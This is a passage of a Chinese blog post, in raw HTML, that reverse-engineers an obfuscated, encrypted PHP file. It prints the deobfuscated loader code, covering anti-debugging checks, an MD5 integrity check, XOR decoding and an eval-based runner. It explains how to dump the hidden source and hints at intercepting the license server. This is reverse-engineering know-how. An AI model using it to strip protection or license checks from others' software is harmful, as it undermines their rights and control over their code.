class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(@<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">decode_func</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, -<span class="number">1522</span>, -<span class="number">46</span>))));</span><br></pre></td></tr></table></figure></div><p>同时可以看到已经 <code>return</code> 加密前的代码了，上述的 <code>-1522</code>就是最先提到的加密代码末尾 <code>?&gt;</code> 后的第一个字符</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" data-fancybox="group" data-caption="decode7" class="fancybox"><img alt="decode7" title="decode7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" class="lazyload"></a></p><h3 id="然后跳到最后"><a href="#然后跳到最后" class="headerlink" title="然后跳到最后"></a>然后跳到最后</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f_varname</span> = <span class="string">&#x27;_f_&#x27;</span>;</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">check_and_decrypt</span>($&#123;<span class="variable">$f_varname</span>&#125;);</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$f_varname</span>&#125;));</span><br><span class="line"><span class="variable">$base64_encoded_decrypted</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$decrypted</span>);</span><br><span class="line"><span class="variable">$eval_string</span> = <span class="string">&#x27;eval(base64_decode($base64_encoded_decrypted));&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">eval</span>(<span class="variable">$eval_string</span>);</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$f_varname</span>&#125;));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></div><p>怎么打印出来呢<br>直接在 <code>$decrypted</code> 后面加上一行 <code>file_put_contents</code> 就可以了。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" data-fancybox="group" data-caption="decode7_2" class="fancybox"><img alt="decode7_2" title="decode7_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" class="lazyload"></a></p><p>然后便可以看到解密后的源码</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" data-fancybox="group" data-caption="decode8" class="fancybox"><img alt="decode8" title="decode8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" class="lazyload"></a></p><p>如果将上述的 35行 <code>server_host</code> 改成 <code>&#39;127.0.0.1&#39;</code> 还可以看到服务器返回的请求验证数据代码</p><h3 id="50行-decode-func"><a href="#50行-decode-func" class="headerlink" title="50行 decode_func"></a>50行 decode_func</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" data-fancybox="group" data-caption="decode9" class="fancybox"><img alt="decode9" title="decode9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" class="lazyload"></a></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>感谢 <a href="https://www.52pojie.cn/thread-693641-1-1.html">Ganlv 师傅</a> 的一路指导</p><h3 id="大致的加密源码"><a href="#大致的加密源码" class="headerlink" title="大致的加密源码"></a>大致的加密源码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先把这两行去掉，防止出现什么问题，我们还什么都不知道。</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;func2&#x27;</span>) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 第一个函数返回 &#x27;base64_decode&#x27; ，这个函数不依赖其他任何函数，单纯地返回一个字符串 &#x27;base64_decode&#x27;。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;6f6e66723634&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;pa&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;7374725f&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;H&#x27;</span> . <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> .= <span class="string">&#x27;ck&#x27;</span>; <span class="comment">// $v2 = &#x27;pack&#x27;;</span></span><br><span class="line">            <span class="variable">$v1</span> .= <span class="string">&#x27;5f717270627172&#x27;</span>; <span class="comment">// $v1 = &#x27;6f6e667236345f717270627172&#x27;;</span></span><br><span class="line">            <span class="variable">$v3</span> .= <span class="string">&#x27;726f743133&#x27;</span>; <span class="comment">// $v3 = &#x27;7374725f726f743133&#x27;;</span></span><br><span class="line">            <span class="comment">// $v5 = $v2($v4, $v3);</span></span><br><span class="line">            <span class="variable">$v5</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="string">&#x27;7374725f726f743133&#x27;</span>);</span><br><span class="line">            <span class="comment">// $v5 = &#x27;str_rot13&#x27;;</span></span><br><span class="line">            <span class="comment">// $v6 = $v5($v2($v4, $v1));</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="string">&#x27;6f6e667236345f717270627172&#x27;</span>));</span><br><span class="line">            <span class="comment">// $v6 = &#x27;base64_decode&#x27;;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v6</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二个函数接受两个参数，要注意第一个参数还是一个引用参数。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params">&amp;<span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 第一句是令一堆变量等于 func4</span></span><br><span class="line">            <span class="comment">// $v1 - $v5 都使用 func4 解码一个字符串，结果如下</span></span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;str_rot13&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;strrev&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;gzuncompress&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;stripslashes&#x27;</span>;</span><br><span class="line">            <span class="variable">$v5</span> = <span class="string">&#x27;explode&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v6 = $v1($v2($v3($v4(func4(&#x27;??????&#x27;)))));</span></span><br><span class="line">            <span class="comment">// $v6 = str_rot13(strrev(gzuncompress(stripslashes(func4(&#x27;??????&#x27;)))));</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="string">&#x27;,chr,addslashes,rand,gzuncompress,assert_options,assert,file_get_contents,substr,unpack,constant,strpos,create_function,str_rot13,md5,set_include_path,dirname,preg_replace,base64_encode,base64_decode,&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v7 = $v5($v6);</span></span><br><span class="line">            <span class="comment">// $v7 = explode($v6);</span></span><br><span class="line">            <span class="variable">$v7</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="number">0</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="number">1</span> =&gt; <span class="string">&quot;chr&quot;</span>,</span><br><span class="line">                <span class="number">2</span> =&gt; <span class="string">&quot;addslashes&quot;</span>,</span><br><span class="line">                <span class="number">3</span> =&gt; <span class="string">&quot;rand&quot;</span>,</span><br><span class="line">                <span class="number">4</span> =&gt; <span class="string">&quot;gzuncompress&quot;</span>,</span><br><span class="line">                <span class="number">5</span> =&gt; <span class="string">&quot;assert_options&quot;</span>,</span><br><span class="line">                <span class="number">6</span> =&gt; <span class="string">&quot;assert&quot;</span>,</span><br><span class="line">                <span class="number">7</span> =&gt; <span class="string">&quot;file_get_contents&quot;</span>,</span><br><span class="line">                <span class="number">8</span> =&gt; <span class="string">&quot;substr&quot;</span>,</span><br><span class="line">                <span class="number">9</span> =&gt; <span class="string">&quot;unpack&quot;</span>,</span><br><span class="line">                <span class="number">10</span> =&gt; <span class="string">&quot;constant&quot;</span>,</span><br><span class="line">                <span class="number">11</span> =&gt; <span class="string">&quot;strpos&quot;</span>,</span><br><span class="line">                <span class="number">12</span> =&gt; <span class="string">&quot;create_function&quot;</span>,</span><br><span class="line">                <span class="number">13</span> =&gt; <span class="string">&quot;str_rot13&quot;</span>,</span><br><span class="line">                <span class="number">14</span> =&gt; <span class="string">&quot;md5&quot;</span>,</span><br><span class="line">                <span class="number">15</span> =&gt; <span class="string">&quot;set_include_path&quot;</span>,</span><br><span class="line">                <span class="number">16</span> =&gt; <span class="string">&quot;dirname&quot;</span>,</span><br><span class="line">                <span class="number">17</span> =&gt; <span class="string">&quot;preg_replace&quot;</span>,</span><br><span class="line">                <span class="number">18</span> =&gt; <span class="string">&quot;base64_encode&quot;</span>,</span><br><span class="line">                <span class="number">19</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>,</span><br><span class="line">                <span class="number">20</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">            );</span><br><span class="line">            <span class="variable">$arg1</span> = <span class="variable">$v7</span>[<span class="variable">$arg2</span>];</span><br><span class="line">            <span class="comment">// 看到这里知道了，这个函数就是用来需要用的提取函数名的</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三个函数被主程序调用了</span></span><br><span class="line">        <span class="comment">// 不过分析之后发现这个 $arg1 参数并没有用到</span></span><br><span class="line">        <span class="comment">// 这个函数的前半部分是防止调试</span></span><br><span class="line">        <span class="comment">// 后半部分是提取后面加密的代码</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func3</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$_v1</span>, <span class="comment">// $_v1 = &#x27;file_get_contents&#x27;;</span></span><br><span class="line">            <span class="variable">$_v3</span>, <span class="comment">// $_v3 = &#x27;substr&#x27;;</span></span><br><span class="line">            <span class="variable">$_v4</span>, <span class="comment">// $_v4 = &#x27;assert&#x27;;</span></span><br><span class="line">            <span class="variable">$_v5</span>, <span class="comment">// $_v5 = &#x27;assert_options&#x27;;</span></span><br><span class="line">            <span class="variable">$_v6</span>, <span class="comment">// $_v6 = &#x27;unpack&#x27;;</span></span><br><span class="line">            <span class="variable">$_v7</span>, <span class="comment">// $_v7 = &#x27;constant&#x27;;</span></span><br><span class="line">            <span class="variable">$_v8</span>, <span class="comment">// $_v8 = &#x27;preg_replace&#x27;;</span></span><br><span class="line">            <span class="variable">$_v9</span>, <span class="comment">// $_v9 = &#x27;base64_encode&#x27;;</span></span><br><span class="line">            <span class="variable">$_v10</span>, <span class="comment">// $_v10 = &#x27;gzuncompress&#x27;;</span></span><br><span class="line">            <span class="variable">$_v11</span>, <span class="comment">// $_v11 = &#x27;create_function&#x27;;</span></span><br><span class="line">            <span class="variable">$_v12</span>, <span class="comment">// $_v12 = &#x27;strpos&#x27;;</span></span><br><span class="line">            <span class="variable">$_v13</span>, <span class="comment">// $_v13 = &#x27;addslashes&#x27;;</span></span><br><span class="line">            <span class="variable">$_v14</span>, <span class="comment">// $_v14 = &#x27;str_rot13&#x27;;</span></span><br><span class="line">            <span class="variable">$_v15</span>, <span class="comment">// $_v15 = &#x27;md5&#x27;;</span></span><br><span class="line">            <span class="variable">$_v16</span>, <span class="comment">// $_v16 = &#x27;set_include_path&#x27;;</span></span><br><span class="line">            <span class="variable">$_v17</span>; <span class="comment">// $_v17 = &#x27;dirname&#x27;;</span></span><br><span class="line">            <span class="comment">// 这里有一堆变量等于 func4，然后用他们解码得到 $v1 - $v5</span></span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;php_sapi_name&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;die&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;cli&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;microtime&#x27;</span>;</span><br><span class="line">            <span class="variable">$v5</span> = <span class="string">&#x27;1000&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v1() == $v3 ? $v2() : &#x27;&#x27;;</span></span><br><span class="line">            <span class="comment">// 这句话在调试的时候需要注释掉</span></span><br><span class="line">            <span class="title function_ invoke__">php_sapi_name</span>() == <span class="string">&#x27;cli&#x27;</span> ? <span class="keyword">die</span>() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="comment">// file_get_contents(constant(func4(&#x27;??????&#x27;)));</span></span><br><span class="line">            <span class="variable">$v7</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="comment">// $v8 = $v4(true) * $v5;</span></span><br><span class="line">            <span class="variable">$v8</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="comment">// if ($v4(true) * $v5 - $v8 &gt; 100) &#123;</span></span><br><span class="line">            <span class="comment">// 这里是防止下断点调试的，下断点调试，这里就超过 100 毫秒了，直接注释掉</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span> - <span class="variable">$v8</span> &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// $v2();</span></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// eval(func4(&#x27;??????&#x27;));</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;if(strpos(__FILE__, msvigqgq) !== 0)&#123;$exitfunc();&#125;&#x27;</span>);</span><br><span class="line">            <span class="comment">// $_v12(func4($_v3($v7, func4(&#x27;??????&#x27;), func4(&#x27;??????&#x27;))), $_v15($_v3($v7, func4(&#x27;??????&#x27;), func4(&#x27;??????&#x27;)))) ? $v9() : $v10;</span></span><br><span class="line">            <span class="comment">// 这里的 $v9 和 $v10 都没有定义，如果验证失败，就会调用 $v9 会直接出错退出程序</span></span><br><span class="line">            <span class="comment">// 而如果验证成功 $v10 变量不存在则没问题</span></span><br><span class="line">            <span class="comment">// 验证方法就是把文件尾部分解密和前面的文件主体部分的md5对比，直接注释掉</span></span><br><span class="line">            !<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">func4</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, -<span class="number">45</span>, -<span class="number">1</span>)), <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, <span class="number">0</span>, -<span class="number">46</span>))) ? <span class="variable">$v9</span>() : <span class="variable">$v10</span>;</span><br><span class="line">            <span class="comment">// 这两个数值是通过 func4 解码得到的</span></span><br><span class="line">            <span class="variable">$v11</span> = <span class="string">&#x27;-2586&#x27;</span>;</span><br><span class="line">            <span class="variable">$v12</span> = <span class="string">&#x27;-46&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v12 = $_v14(@$_v10(func4(substr($v7, $v11, $v12))));</span></span><br><span class="line">            <span class="variable">$v12</span> = <span class="title function_ invoke__">str_rot13</span>(@<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">func4</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, <span class="variable">$v11</span>, <span class="variable">$v12</span>))));</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v12</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第四个函数有点复杂，这是一个解码函数，用的是异或算法解密，所有调用 func4 的位置都没有提供 $arg2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func4</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v2 - $v4 通过 base64_decode 解码得到</span></span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;ord&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;strlen&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;chr&#x27;</span>;</span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? $v2(&#x27;?&#x27;) : $arg2;</span></span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? 136 : $arg2;</span></span><br><span class="line">            <span class="variable">$arg2</span> = <span class="number">136</span>;</span><br><span class="line">            <span class="comment">// 这里 $v5 不存在，所以 $v6 = null;</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="variable">$v5</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($arg1); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; <span class="variable">$v6</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$arg1</span>); <span class="variable">$v6</span>++) &#123;</span><br><span class="line">                <span class="comment">// $v7 .= $v2($arg1[$v6]) &lt; $v2(&#x27;?&#x27;) ? $v2($arg1[$v6]) &gt; $arg2 &amp;&amp; $v2($arg1[$v6]) &lt; 245 ? $v4($v2($arg1[$v6]) / 2) : $arg1[$v6] : &#x27;&#x27;;</span></span><br><span class="line">                <span class="variable">$v7</span> .= <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &lt; <span class="number">245</span> ? <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &gt; <span class="variable">$arg2</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &lt; <span class="number">245</span> ? <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) / <span class="number">2</span>) : <span class="variable">$arg1</span>[<span class="variable">$v6</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// $v8 = $v1($v7);</span></span><br><span class="line">            <span class="variable">$v8</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v7</span>);</span><br><span class="line">            <span class="variable">$v9</span> = <span class="string">&#x27;md5&#x27;</span>; <span class="comment">// $v9 通过 base64_decode 解码得到</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="variable">$v5</span>;</span><br><span class="line">            <span class="comment">// $arg2 = $v9(&#x27;8_Q.L2&#x27;);</span></span><br><span class="line">            <span class="comment">// $arg2 = md5(&#x27;8_Q.L2&#x27;);</span></span><br><span class="line">            <span class="variable">$arg2</span> = <span class="string">&#x27;fac02565267d815643cecee75a16c7bd&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = $v3($arg2);</span></span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = strlen($arg2);</span></span><br><span class="line">            <span class="variable">$v10</span> = <span class="variable">$ctrmax</span> = <span class="number">32</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($v8); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; <span class="variable">$v6</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$v8</span>); <span class="variable">$v6</span>++) &#123;</span><br><span class="line">                <span class="variable">$v10</span> = <span class="variable">$v10</span> ? <span class="variable">$v10</span> : <span class="variable">$ctrmax</span>;</span><br><span class="line">                <span class="variable">$v10</span>--;</span><br><span class="line">                <span class="variable">$v11</span> .= <span class="variable">$v8</span>[<span class="variable">$v6</span>] ^ <span class="variable">$arg2</span>[<span class="variable">$v10</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v11</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$_v1</span>, <span class="comment">// $_v1 = &#x27;file_get_contents&#x27;;</span></span><br><span class="line"><span class="variable">$_v2</span>, <span class="comment">// $_v2 = &#x27;chr&#x27;;</span></span><br><span class="line"><span class="variable">$_v3</span>, <span class="comment">// $_v3 = &#x27;substr&#x27;;</span></span><br><span class="line"><span class="variable">$_v4</span>, <span class="comment">// $_v4 = &#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$_v5</span>, <span class="comment">// $_v5 = &#x27;assert_options&#x27;;</span></span><br><span class="line"><span class="variable">$_v6</span>, <span class="comment">// $_v6 = &#x27;unpack&#x27;;</span></span><br><span class="line"><span class="variable">$_v7</span>, <span class="comment">// $_v7 = &#x27;constant&#x27;;</span></span><br><span class="line"><span class="variable">$_v8</span>, <span class="comment">// $_v8 = &#x27;preg_replace&#x27;;</span></span><br><span class="line"><span class="variable">$_v9</span>, <span class="comment">// $_v9 = &#x27;base64_encode&#x27;;</span></span><br><span class="line"><span class="variable">$_v10</span>, <span class="comment">// $_v10 = &#x27;gzuncompress&#x27;;</span></span><br><span class="line"><span class="variable">$_v11</span>, <span class="comment">// $_v11 = &#x27;create_function&#x27;;</span></span><br><span class="line"><span class="variable">$_v12</span>, <span class="comment">// $_v12 = &#x27;strpos&#x27;;</span></span><br><span class="line"><span class="variable">$_v13</span>, <span class="comment">// $_v13 = &#x27;addslashes&#x27;;</span></span><br><span class="line"><span class="variable">$_v14</span>, <span class="comment">// $_v14 = &#x27;str_rot13&#x27;;</span></span><br><span class="line"><span class="variable">$_v15</span>, <span class="comment">// $_v15 = &#x27;md5&#x27;;</span></span><br><span class="line"><span class="variable">$_v16</span>, <span class="comment">// $_v16 = &#x27;set_include_path&#x27;;</span></span><br><span class="line"><span class="variable">$_v17</span>; <span class="comment">// $_v17 = &#x27;dirname&#x27;;</span></span><br><span class="line"><span class="comment">// 然后一堆变量等于 func2</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_v1</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 func2 用传递引用变量的方法赋值，简化之后如下</span></span><br><span class="line">    <span class="variable">$_v1</span> = <span class="string">&#x27;file_get_contents&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v3</span> = <span class="string">&#x27;substr&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v6</span> = <span class="string">&#x27;unpack&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v10</span> = <span class="string">&#x27;gzuncompress&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v11</span> = <span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v12</span> = <span class="string">&#x27;strpos&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v13</span> = <span class="string">&#x27;addslashes&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v14</span> = <span class="string">&#x27;str_rot13&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v15</span> = 